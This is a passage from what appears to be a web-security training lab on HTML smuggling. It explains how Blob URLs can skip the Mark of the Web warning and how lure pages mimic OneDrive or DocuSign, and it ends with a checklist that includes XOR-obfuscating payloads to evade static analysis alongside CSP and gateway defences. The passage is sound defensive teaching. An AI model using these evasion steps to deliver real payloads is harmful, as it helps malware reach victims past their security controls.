  VHD, ZIP, MSI, or anything else the attacker needs. The same HTML template can deliver different
  payloads by simply swapping the encoded data.</li>
  <li><strong>Social engineering synergy.</strong> The HTML page can be styled to match any brand
  or service, making the social engineering component highly effective. Victims see what they
  expect to see: a OneDrive sharing page, a DocuSign document, a SharePoint portal.</li>
  <li><strong>Mark of the Web bypass.</strong> Files constructed via JavaScript Blob URLs do not
  always receive the Mark of the Web (MOTW) flag that Windows uses to identify files from the
  internet. Without MOTW, Windows does not show the "this file came from the internet" security
  warning, and files can execute with fewer restrictions.</li>
</ul>

<div class="callout warn">
  <div class="callout-title">Mark of the Web (MOTW) Evolution</div>
  <div class="callout-text">
    Microsoft has been tightening MOTW handling in response to smuggling attacks. Recent Windows
    updates propagate MOTW into ISO and IMG files, meaning files extracted from a downloaded ISO
    now inherit the MOTW flag. However, attackers continually find new container formats and
    techniques to bypass MOTW. This is an ongoing cat-and-mouse game between OS vendors and
    threat actors.
  </div>
</div>

<p>
  The key takeaway: HTML smuggling is a first-stage delivery technique. It does not compromise
  your application directly. It delivers the payload that does. Your defenses must operate at
  multiple layers — email gateway, network proxy, browser policy, and endpoint detection — because
  no single layer can stop all variants. And as you build web applications, understand that
  features like the Blob API, service workers, and data URIs have legitimate uses, but they are
  also the building blocks attackers use to bypass your network security.
</p>

<hr>

<h2>Lab 16 Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Understand the core concept: HTML smuggling assembles malicious files client-side using JavaScript, bypassing network-level inspection</li>
  <li><span class="task-check"></span> Build a Blob-based smuggling demo page that decodes a Base64 payload, constructs a Blob, and triggers a download of a harmless text file</li>
  <li><span class="task-check"></span> Create a data URI variant and test which browsers support the download attribute on data URI anchor tags</li>
  <li><span class="task-check"></span> Implement the auto-download pattern with click simulation and observe how it behaves with and without user gesture requirements</li>
  <li><span class="task-check"></span> Apply XOR obfuscation to the payload data and verify that the encoded form is not recognizable as Base64 to static analysis</li>
  <li><span class="task-check"></span> Configure a Content Security Policy that blocks inline scripts and verify that it prevents the smuggling page from executing</li>
  <li><span class="task-check"></span> Research the Nobelium ISO smuggling campaign and the Qakbot HTML smuggling waves to understand real-world attack chains</li>
  <li><span class="task-check"></span> Evaluate your organization's email gateway, browser policies, and EDR capabilities against each smuggling variant covered in this lab</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="ratelimit">Back: Rate-Limiting</button>
  <button class="nav-btn" data-next="ssrf">Next: SSRF</button>
</div>

`;
